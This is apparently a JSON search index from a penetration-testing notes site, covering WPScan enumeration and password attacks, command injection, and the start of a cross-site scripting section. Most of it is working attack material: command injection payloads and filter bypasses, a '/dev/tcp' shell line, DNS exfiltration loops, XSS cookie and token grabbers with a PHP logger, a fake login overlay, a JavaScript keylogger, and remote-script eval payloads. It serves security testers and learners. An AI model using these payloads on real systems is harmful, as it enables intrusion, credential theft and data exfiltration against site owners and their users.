enumerates plugins using passive detection meaning that it only scans the main page and searches for traces of plugins in the HTML content, JavaScript and CSS files.</p> <p>We can run more aggressive scans with WPScan that actively test WordPress installations for plugins and themes. Depending on the options selected, an active scan tries every plugin from the database to test if it\u2019s present on the target system. Active scans usually yield a much more reliable result. The following parameters can be used in conjunction with the enumerate option:</p> <ul> <li>p: Scans popular plugins only</li> <li>vp: Scans vulnerable plugins only</li> <li>ap: Scans all plugins</li> </ul> <p>To enable the active/aggressive scan option to scan for all plugins we also have to set the aggressive mode using the <code>--plugins-version-detection</code> option.</p> <p>The same options are available for WordPress themes:</p> <ul> <li>t: Scans popular themes only</li> <li>vt: Scans vulnerable themes only</li> <li>at: Scans all themes</li> </ul> <pre><code>wpscan --url [url] --enumerate [p/vp/ap/t/vt/at] --plugins-detection aggressive\n</code></pre> <p>To scan for all plugins:</p> <pre><code>wpscan --url [url] --enumerate ap --plugins-detection aggressive\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#enumerating-wordpress-users","title":"Enumerating WordPress Users","text":"<pre><code>wpscan --url [target URL] --enumerate u\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#password-attack","title":"Password Attack","text":"<pre><code>wpscan --url http://internal.thm/blog/ --passwords /opt/wordlists/rockyou.txt\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#scanning-with-api-tokens","title":"Scanning with API Tokens","text":"<pre><code>wpscan --url https://brainfuck.htb --api-token &lt;redacted&gt;\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#disable-tls-checks","title":"Disable TLS Checks","text":"<pre><code>wpscan --url https://brainfuck.htb --disable-tls-checks --api-token &lt;redacted&gt;\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#backup-file-search","title":"Backup File Search","text":"<pre><code>./bfac --url http://$ip/ --level 4\n</code></pre>"},{"location":"web-application-attacks/command-injection/","title":"Command Injection","text":"<p>Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.</p>"},{"location":"web-application-attacks/command-injection/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploits</li> <li>Basic commands</li> <li>Chaining commands</li> <li>Argument injection</li> <li>Inside a command</li> <li>Filter Bypasses</li> <li>Bypass without space</li> <li>Bypass with a line return</li> <li>Bypass with backslash newline</li> <li>Bypass characters filter via hex encoding</li> <li>Bypass blacklisted words</li> <li>Bypass with single quote</li> <li>Bypass with double quote</li> <li>Bypass with backslash and slash</li> <li>Bypass with $@</li> <li>Bypass with $()</li> <li>Bypass with variable expansion</li> <li>Bypass with wildcards</li> <li>Data Exfiltration</li> <li>Time based data exfiltration</li> <li>DNS based data exfiltration</li> <li>Polyglot Command Injection</li> <li>Tricks</li> <li>Backgrounding long running commands</li> <li>Remove arguments after the injection</li> <li>Labs</li> <li>Challenge</li> <li>References</li> </ul>"},{"location":"web-application-attacks/command-injection/#tools","title":"Tools","text":"<ul> <li>commixproject/commix - Automated All-in-One OS command injection and exploitation tool</li> <li>projectdiscovery/interactsh - An OOB interaction gathering server and client library</li> </ul>"},{"location":"web-application-attacks/command-injection/#exploits","title":"Exploits","text":"<p>Command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable application. This vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell. In this context, the system shell is a command-line interface that processes commands to be executed, typically on a Unix or Linux system.</p> <p>The danger of command injection is that it can allow an attacker to execute any command on the system, potentially leading to full system compromise.</p> <p>Example of Command Injection with PHP:   Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:</p> <pre><code>&lt;?php\n    $ip = $_GET['ip'];\n    system(\"ping -c 4 \" . $ip);\n?&gt;\n</code></pre> <p>In the above code, the PHP script uses the <code>system()</code> function to execute the <code>ping</code> command with the IP address or domain provided by the user through the <code>ip</code> GET parameter.</p> <p>If an attacker provides input like <code>8.8.8.8; cat /etc/passwd</code>, the actual command that gets executed would be: <code>ping -c 4 8.8.8.8; cat /etc/passwd</code>.</p> <p>This means the system would first <code>ping 8.8.8.8</code> and then execute the <code>cat /etc/passwd</code> command, which would display the contents of the <code>/etc/passwd</code> file, potentially revealing sensitive information.</p>"},{"location":"web-application-attacks/command-injection/#basic-commands","title":"Basic commands","text":"<p>Execute the command and voila :p</p> <pre><code>cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\n...\n</code></pre>"},{"location":"web-application-attacks/command-injection/#chaining-commands","title":"Chaining commands","text":"<p>In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. </p> <ul> <li><code>;</code> (Semicolon): Allows you to execute multiple commands sequentially.</li> <li><code>&amp;&amp;</code> (AND): Execute the second command only if the first command succeeds (returns a zero exit status).</li> <li><code>||</code> (OR): Execute the second command only if the first command fails (returns a non-zero exit status).</li> <li><code>&amp;</code> (Background): Execute the command in the background, allowing the user to continue using the shell.</li> <li><code>|</code> (Pipe):  Takes the output of the first command and uses it as the input for the second command.</li> </ul> <pre><code>command1; command2   # Execute command1 and then command2\ncommand1 &amp;&amp; command2 # Execute command2 only if command1 succeeds\ncommand1 || command2 # Execute command2 only if command1 fails\ncommand1 &amp; command2  # Execute command1 in the background\ncommand1 | command2  # Pipe the output of command1 into command2\n</code></pre>"},{"location":"web-application-attacks/command-injection/#argument-injection","title":"Argument Injection","text":"<p>Gain a command execution when you can only append arguments to an existing command. Use this website Argument Injection Vectors - Sonar to find the argument to inject to gain command execution.</p> <ul> <li> <p>Chrome     <pre><code>chrome '--gpu-launcher=\"id&gt;/tmp/foo\"'\n</code></pre></p> </li> <li> <p>SSH     <pre><code>ssh '-oProxyCommand=\"touch /tmp/foo\"' foo@foo\n</code></pre></p> </li> <li> <p>psql     <pre><code>psql -o'|id&gt;/tmp/foo'\n</code></pre></p> </li> </ul>"},{"location":"web-application-attacks/command-injection/#inside-a-command","title":"Inside a command","text":"<ul> <li>Command injection using backticks.    <pre><code>original_cmd_by_server `cat /etc/passwd`\n</code></pre></li> <li>Command injection using substitution   <pre><code>original_cmd_by_server $(cat /etc/passwd)\n</code></pre></li> </ul>"},{"location":"web-application-attacks/command-injection/#filter-bypasses","title":"Filter Bypasses","text":""},{"location":"web-application-attacks/command-injection/#bypass-without-space","title":"Bypass without space","text":"<ul> <li><code>$IFS</code> is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret <code>$IFS</code> as a space. <code>$IFS</code> does not directly work as a seperator in commands like <code>ls</code>, <code>wget</code>; use <code>${IFS}</code> instead.    <pre><code>cat${IFS}/etc/passwd\nls${IFS}-la\n</code></pre></li> <li>In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.   <pre><code>{cat,/etc/passwd}\n</code></pre></li> <li>Input redirection. The &lt; character tells the shell to read the contents of the file specified.    <pre><code>cat&lt;/etc/passwd\nsh&lt;/dev/tcp/127.0.0.1/4242\n</code></pre></li> <li>ANSI-C Quoting    <pre><code>X=$'uname\\x20-a'&amp;&amp;$X\n</code></pre></li> <li>The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value <code>09</code>.   <pre><code>;ls%09-al%09/home\n</code></pre></li> <li>In Windows, <code>%VARIABLE:~start,length%</code> is a syntax used for substring operations on environment variables.   <pre><code>ping%CommonProgramFiles:~10,-18%127.0.0.1\nping%PROGRAMFILES:~10,-5%127.0.0.1\n</code></pre></li> </ul>"},{"location":"web-application-attacks/command-injection/#bypass-with-a-line-return","title":"Bypass with a line return","text":"<p>Commands can also be run in sequence with newlines</p> <pre><code>original_cmd_by_server\nls\n</code></pre>"},{"location":"web-application-attacks/command-injection/#bypass-with-backslash-newline","title":"Bypass with backslash newline","text":"<ul> <li>Commands can be broken into parts by using backslash followed by a newline   <pre><code>$ cat /et\\\nc/pa\\\nsswd\n</code></pre></li> <li>URL encoded form would look like this:   <pre><code>cat%20/et%5C%0Ac/pa%5C%0Asswd\n</code></pre></li> </ul>"},{"location":"web-application-attacks/command-injection/#bypass-characters-filter-via-hex-encoding","title":"Bypass characters filter via hex encoding","text":"<pre><code>kali@kali:~$ echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"\n/etc/passwd\n\nkali@kali:~$ cat `echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"`\nroot:x:0:0:root:/root:/bin/bash\n\nkali@kali:~$ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc\nroot:x:0:0:root:/root:/bin/bash\n\nkali@kali:~$ `echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`\nroot:x:0:0:root:/root:/bin/bash\n\nkali@kali:~$ xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764\n/etc/passwd\n\nkali@kali:~$ cat `xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764`\nroot:x:0:0:root:/root:/bin/bash\n\nkali@kali:~$ xxd -r -ps &lt;(echo 2f6574632f706173737764)\n/etc/passwd\n\nkali@kali:~$ cat `xxd -r -ps &lt;(echo 2f6574632f706173737764)`\nroot:x:0:0:root:/root:/bin/bash\n</code></pre>"},{"location":"web-application-attacks/command-injection/#bypass-characters-filter","title":"Bypass characters filter","text":"<p>Commands execution without backslash and slash - linux bash</p> <pre><code>kali@kali:~$ echo ${HOME:0:1}\n/\n\nkali@kali:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd\nroot:x:0:0:root:/root:/bin/bash\n\nkali@kali:~$ echo . | tr '!-0' '\"-1'\n/\n\nkali@kali:~$ tr '!-0' '\"-1' &lt;&lt;&lt; .\n/\n\nkali@kali:~$ cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd\nroot:x:0:0:root:/root:/bin/bash\n</code></pre>"},{"location":"web-application-attacks/command-injection/#bypass-blacklisted-words","title":"Bypass Blacklisted words","text":""},{"location":"web-application-attacks/command-injection/#bypass-with-single-quote","title":"Bypass with single quote","text":"<pre><code>w'h'o'am'i\n</code></pre>"},{"location":"web-application-attacks/command-injection/#bypass-with-double-quote","title":"Bypass with double quote","text":"<pre><code>w\"h\"o\"am\"i\n</code></pre>"},{"location":"web-application-attacks/command-injection/#bypass-with-backslash-and-slash","title":"Bypass with backslash and slash","text":"<pre><code>w\\ho\\am\\i\n/\\b\\i\\n/////s\\h\n</code></pre>"},{"location":"web-application-attacks/command-injection/#bypass-with","title":"Bypass with $@","text":"<p><code>$0</code>: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, <code>$0</code> will typically give the name of the shell.</p> <pre><code>who$@ami\necho whoami|$0\n</code></pre>"},{"location":"web-application-attacks/command-injection/#bypass-with_1","title":"Bypass with $()","text":"<pre><code>who$()ami\nwho$(echo am)i\nwho`echo am`i\n</code></pre>"},{"location":"web-application-attacks/command-injection/#bypass-with-variable-expansion","title":"Bypass with variable expansion","text":"<pre><code>/???/??t /???/p??s??\n\ntest=/ehhh/hmtc/pahhh/hmsswd\ncat ${test//hhh\\/hm/}\ncat ${test//hh??hm/}\n</code></pre>"},{"location":"web-application-attacks/command-injection/#bypass-with-wildcards","title":"Bypass with wildcards","text":"<pre><code>powershell C:\\*\\*2\\n??e*d.*? # notepad\n@^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e # calc\n</code></pre>"},{"location":"web-application-attacks/command-injection/#data-exfiltration","title":"Data Exfiltration","text":""},{"location":"web-application-attacks/command-injection/#time-based-data-exfiltration","title":"Time based data exfiltration","text":"<p>Extracting data : char by char</p> <pre><code>kali@kali:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi\nreal    0m5.007s\nuser    0m0.000s\nsys 0m0.000s\n\nkali@kali:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi\nreal    0m0.002s\nuser    0m0.000s\nsys 0m0.000s\n</code></pre>"},{"location":"web-application-attacks/command-injection/#dns-based-data-exfiltration","title":"DNS based data exfiltration","text":"<p>Based on the tool from <code>https://github.com/HoLyVieR/dnsbin</code> also hosted at dnsbin.zhack.ca</p> <pre><code>1. Go to http://dnsbin.zhack.ca/\n2. Execute a simple 'ls'\nfor i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done\n</code></pre> <pre><code>$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)\n</code></pre> <p>Online tools to check for DNS based data exfiltration:</p> <ul> <li>dnsbin.zhack.ca</li> <li>pingb.in</li> </ul>"},{"location":"web-application-attacks/command-injection/#polyglot-command-injection","title":"Polyglot Command Injection","text":"<p>A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about \"polyglot command injection,\" we're referring to an injection payload that can be executed in multiple contexts or environments.</p> <ul> <li>Example 1:   <pre><code>Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n\n# Context inside commands with single and double quote:\necho 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\necho '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\necho \"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n</code></pre></li> <li>Example 2:    <pre><code>Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\n\n# Context inside commands with single and double quote:\necho 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\necho \"YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\"\necho 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/'\n</code></pre></li> </ul>"},{"location":"web-application-attacks/command-injection/#tricks","title":"Tricks","text":""},{"location":"web-application-attacks/command-injection/#backgrounding-long-running-commands","title":"Backgrounding long running commands","text":"<p>In some instances, you might have a long running command that gets killed by the process injecting it timing out. Using <code>nohup</code>, you can keep the process running after the parent process exits.</p> <pre><code>nohup sleep 120 &gt; /dev/null &amp;\n</code></pre>"},{"location":"web-application-attacks/command-injection/#remove-arguments-after-the-injection","title":"Remove arguments after the injection","text":"<p>In Unix-like command-line interfaces, the <code>--</code> symbol is used to signify the end of command options. After <code>--</code>, all arguments are treated as filenames and arguments, and not as options.</p>"},{"location":"web-application-attacks/command-injection/#labs","title":"Labs","text":"<ul> <li>OS command injection, simple case</li> <li>Blind OS command injection with time delays</li> <li>Blind OS command injection with output redirection</li> <li>Blind OS command injection with out-of-band interaction</li> <li>Blind OS command injection with out-of-band data exfiltration</li> </ul>"},{"location":"web-application-attacks/command-injection/#references","title":"References","text":"<ul> <li>SECURITY CAF\u00c9 - Exploiting Timed Based RCE</li> <li>Bug Bounty Survey - Windows RCE spaceless</li> <li>No PHP, no spaces, no $, no { }, bash only - @asdizzle</li> <li>#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware</li> <li>What is OS command injection - portswigger</li> <li>Argument Injection Vectors - Sonar</li> </ul>"},{"location":"web-application-attacks/cross-site-scripting/","title":"Cross Site Scripting","text":"<p>Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.</p>"},{"location":"web-application-attacks/cross-site-scripting/#summary","title":"Summary","text":"<ul> <li>Cross Site Scripting</li> <li>Vulnerability Details</li> <li>Exploit code or POC<ul> <li>Data grabber for XSS</li> <li>CORS</li> <li>UI redressing</li> <li>Javascript keylogger</li> <li>Other ways</li> </ul> </li> <li>Identify an XSS endpoint<ul> <li>Tools</li> </ul> </li> <li>XSS in HTML/Applications<ul> <li>Common Payloads</li> <li>XSS using HTML5 tags</li> <li>XSS using a remote JS</li> <li>XSS in hidden input</li> <li>XSS when payload is reflected capitalized</li> <li>DOM based XSS</li> <li>XSS in JS Context</li> </ul> </li> <li>XSS in wrappers javascript and data URI</li> <li>XSS in files<ul> <li>XSS in XML</li> <li>XSS in SVG</li> <li>XSS in SVG (short)</li> <li>XSS in Markdown</li> <li>XSS in SWF flash application</li> <li>XSS in SWF flash application</li> <li>XSS in CSS</li> </ul> </li> <li>XSS in PostMessage</li> <li>Blind XSS<ul> <li>XSS Hunter</li> <li>Other Blind XSS tools</li> <li>Blind XSS endpoint</li> <li>Tips</li> </ul> </li> <li>Mutated XSS</li> <li>Polyglot XSS</li> <li>Filter Bypass and exotic payloads<ul> <li>Bypass case sensitive</li> <li>Bypass tag blacklist</li> <li>Bypass word blacklist with code evaluation</li> <li>Bypass with incomplete html tag</li> <li>Bypass quotes for string</li> <li>Bypass quotes in script tag</li> <li>Bypass quotes in mousedown event</li> <li>Bypass dot filter</li> <li>Bypass parenthesis for string</li> <li>Bypass parenthesis and semi colon</li> <li>Bypass onxxxx= blacklist</li> <li>Bypass space filter</li> <li>Bypass email filter</li> <li>Bypass document blacklist</li> <li>Bypass document.cookie blacklist</li> <li>Bypass using javascript inside a string</li> <li>Bypass using an alternate way to redirect</li> <li>Bypass using an alternate way to execute an alert</li> <li>Bypass \"&gt;\" using nothing</li> <li>Bypass \"&lt;\" and \"&gt;\" using \uff1c and \uff1e</li> <li>Bypass \";\" using another character</li> <li>Bypass using HTML encoding</li> <li>Bypass using Katakana</li> <li>Bypass using Cuneiform</li> <li>Bypass using Lontara</li> <li>Bypass using ECMAScript6</li> <li>Bypass using Octal encoding</li> <li>Bypass using Unicode</li> <li>Bypass using UTF-7</li> <li>Bypass using UTF-8</li> <li>Bypass using UTF-16be</li> <li>Bypass using UTF-32</li> <li>Bypass using BOM</li> <li>Bypass using weird encoding or native interpretation</li> <li>Bypass using jsfuck</li> </ul> </li> <li>CSP Bypass<ul> <li>Bypass CSP using JSONP from Google (Trick by @apfeifer27)</li> <li>Bypass CSP by lab.wallarm.com</li> <li>Bypass CSP by Rhynorater</li> <li>Bypass CSP by @akita_zen</li> <li>Bypass CSP by @404death</li> </ul> </li> <li>Common WAF Bypass<ul> <li>Cloudflare XSS Bypasses by @Bohdan Korzhynskyi</li> <li>25st January 2021</li> <li>21st April 2020</li> <li>22nd August 2019</li> <li>5th June 2019</li> <li>3rd June 2019</li> <li>Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)</li> <li>Cloudflare XSS Bypass - 27th February 2018</li> <li>Chrome Auditor - 9th August 2018</li> <li>Incapsula WAF Bypass by @Alra3ees- 8th March 2018</li> <li>Incapsula WAF Bypass by @c0d3G33k - 11th September 2018</li> <li>Incapsula WAF Bypass by @daveysec - 11th May 2019</li> <li>Akamai WAF Bypass by @zseano - 18th June 2018</li> <li>Akamai WAF Bypass by @s0md3v - 28th October 2018</li> <li>WordFence WAF Bypass by @brutelogic - 12th September 2018</li> <li>Fortiweb WAF Bypass by @rezaduty - 9th July 2019</li> </ul> </li> <li>References</li> </ul>"},{"location":"web-application-attacks/cross-site-scripting/#vulnerability-details","title":"Vulnerability Details","text":"<p>Cross-Site Scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.</p> <p>There are 3 main types of XSS attacks:</p> <ul> <li> <p>Reflected XSS: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.</p> </li> <li> <p>Stored XSS: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.</p> </li> <li> <p>DOM-based XSS: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.</p> </li> </ul> <p>To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.</p>"},{"location":"web-application-attacks/cross-site-scripting/#exploit-code-or-poc","title":"Exploit code or POC","text":""},{"location":"web-application-attacks/cross-site-scripting/#data-grabber-for-xss","title":"Data grabber for XSS","text":"<p>Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.</p> <pre><code>&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+document.cookie&lt;/script&gt;\n&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')&lt;/script&gt;\n&lt;script&gt;new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;&lt;/script&gt;\n&lt;script&gt;new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');&lt;/script&gt;\n</code></pre> <p>Write the collected data into a file.</p> <pre><code>&lt;?php\n$cookie = $_GET['c'];\n$fp = fopen('cookies.txt', 'a+');\nfwrite($fp, 'Cookie:' .$cookie.\"\\r\\n\");\nfclose($fp);\n?&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#cors","title":"CORS","text":"<pre><code>&lt;script&gt;\n  fetch('https://&lt;SESSION&gt;.burpcollaborator.net', {\n  method: 'POST',\n  mode: 'no-cors',\n  body: document.cookie\n  });\n&lt;/script&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#ui-redressing","title":"UI redressing","text":"<p>Leverage the XSS to modify the HTML content of the page in order to display a fake login form.</p> <pre><code>&lt;script&gt;\nhistory.replaceState(null, null, '../../../login');\ndocument.body.innerHTML = \"&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;h1&gt;Please login to continue&lt;/h1&gt;&lt;form&gt;Username: &lt;input type='text'&gt;Password: &lt;input type='password'&gt;&lt;/form&gt;&lt;input value='submit' type='submit'&gt;\"\n&lt;/script&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#javascript-keylogger","title":"Javascript keylogger","text":"<p>Another way to collect sensitive data is to set a javascript keylogger.</p> <pre><code>&lt;img src=x onerror='document.onkeypress=function(e){fetch(\"http://domain.com?k=\"+String.fromCharCode(e.which))},this.remove();'&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#other-ways","title":"Other ways","text":"<p>More exploits at http://www.xss-payloads.com/payloads-list.html?a#category=all:</p> <ul> <li>Taking screenshots using XSS and the HTML5 Canvas</li> <li>JavaScript Port Scanner</li> <li>Network Scanner</li> <li>.NET Shell execution</li> <li>Redirect Form</li> <li>Play Music</li> </ul>"},{"location":"web-application-attacks/cross-site-scripting/#identify-an-xss-endpoint","title":"Identify an XSS endpoint","text":"<p>This payload opens the debugger in the developer console rather than triggering a popup alert box.</p> <pre><code>&lt;script&gt;debugger;&lt;/script&gt;\n</code></pre> <p>Modern applications with content hosting can use sandbox domains</p> <p>to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.</p> <p>For this reason, it's better to use <code>alert(document.domain)</code> or <code>alert(window.origin)</code> rather than <code>alert(1)</code> as default XSS payload in order to know in which scope the XSS is actually executing.</p> <p>Better payload replacing <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>:</p> <pre><code>&lt;script&gt;alert(document.domain.concat(\"\\n\").concat(window.origin))&lt;/script&gt;\n</code></pre> <p>While <code>alert()</code> is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so <code>console.log()</code> can be used instead to display a message in the console of the developer console (doesn't require any interaction).</p> <p>Example:</p> <pre><code>&lt;script&gt;console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))&lt;/script&gt;\n</code></pre> <p>References:</p> <ul> <li>Google Bughunter University - XSS in sandbox domains</li> <li>LiveOverflow Video - DO NOT USE alert(1) for XSS</li> <li>LiveOverflow blog post - DO NOT USE alert(1) for XSS</li> </ul>"},{"location":"web-application-attacks/cross-site-scripting/#tools","title":"Tools","text":"<p>Most tools are also suitable for blind XSS attacks:</p> <ul> <li>XSSStrike: Very popular but unfortunately not very well maintained</li> <li>xsser: Utilizes a headless browser to detect XSS vulnerabilities</li> <li>Dalfox: Extensive functionality and extremely fast thanks to the implementation in Go</li> <li>XSpear: Similar to Dalfox but based on Ruby</li> <li>domdig: Headless Chrome XSS Tester</li> </ul>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-htmlapplications","title":"XSS in HTML/Applications","text":""},{"location":"web-application-attacks/cross-site-scripting/#common-payloads","title":"Common Payloads","text":"<pre><code>// Basic payload\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;\n\"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;\n\"&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;\n&lt;script&gt;\\u0061lert('22')&lt;/script&gt;\n&lt;script&gt;eval('\\x61lert(\\'33\\')')&lt;/script&gt;\n&lt;script&gt;eval(8680439..toString(30))(983801..toString(36))&lt;/script&gt; //parseInt(\"confirm\",30) == 8680439 &amp;&amp; 8680439..toString(30) == \"confirm\"\n&lt;object/data=\"jav&amp;#x61;sc&amp;#x72;ipt&amp;#x3a;al&amp;#x65;rt&amp;#x28;23&amp;#x29;\"&gt;\n\n// Img payload\n&lt;img src=x onerror=alert('XSS');&gt;\n&lt;img src=x onerror=alert('XSS')//\n&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;\n\"&gt;&lt;img src=x onerror=alert('XSS');&gt;\n\"&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;\n\n// Svg payload\n&lt;svg\fonload=alert(1)&gt;\n&lt;svg/onload=alert('XSS')&gt;\n&lt;svg onload=alert(1)//\n&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;\n&lt;svg id=alert(1) onload=eval(id)&gt;\n\"&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;\n\"&gt;&lt;svg/onload=alert(/XSS/)\n&lt;svg&gt;&lt;script href=data:,alert(1) /&gt;(`Firefox` is the only browser which allows self closing script)\n&lt;svg&gt;&lt;script&gt;alert('33')\n&lt;svg&gt;&lt;script&gt;alert&amp;lpar;'33'&amp;rpar;\n\n// Div payload\n&lt;div onpointerover=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerdown=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerenter=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerleave=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointermove=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerout=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerup=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-using-html5-tags","title":"XSS using HTML5 tags","text":"<pre><code>&lt;body onload=alert(/XSS/.source)&gt;\n&lt;input autofocus onfocus=alert(1)&gt;\n&lt;select autofocus onfocus=alert(1)&gt;\n&lt;textarea autofocus onfocus=alert(1)&gt;\n&lt;keygen autofocus onfocus=alert(1)&gt;\n&lt;video/poster/onerror=alert(1)&gt;\n&lt;video&gt;&lt;source onerror=\"javascript:alert(1)\"&gt;\n&lt;video src=_ onloadstart=\"alert(1)\"&gt;\n&lt;details/open/ontoggle=\"alert`1`\"&gt;\n&lt;audio src onloadstart=alert(1)&gt;\n&lt;marquee onstart=alert(1)&gt;\n&lt;meter value=2 min=0 max=10 onmouseover=alert(1)&gt;2 out of 10&lt;/meter&gt;\n\n&lt;body ontouchstart=alert(1)&gt; // Triggers when a finger touch the screen\n&lt;body ontouchend=alert(1)&gt;   // Triggers when a finger is removed from touch screen\n&lt;body ontouchmove=alert(1)&gt;  // When a finger is dragged across the screen.\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-using-a-remote-js","title":"XSS using a remote JS","text":"<pre><code>&lt;svg/onload='fetch(\"//host/a\").then(r=&gt;r.text().then(t=&gt;eval(t)))'&gt;\n&lt;script src=14.rs&gt;\n// you can also specify an arbitrary payload with 14.rs/#payload\ne.g: 14.rs/#alert(document.domain)\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-hidden-input","title":"XSS in 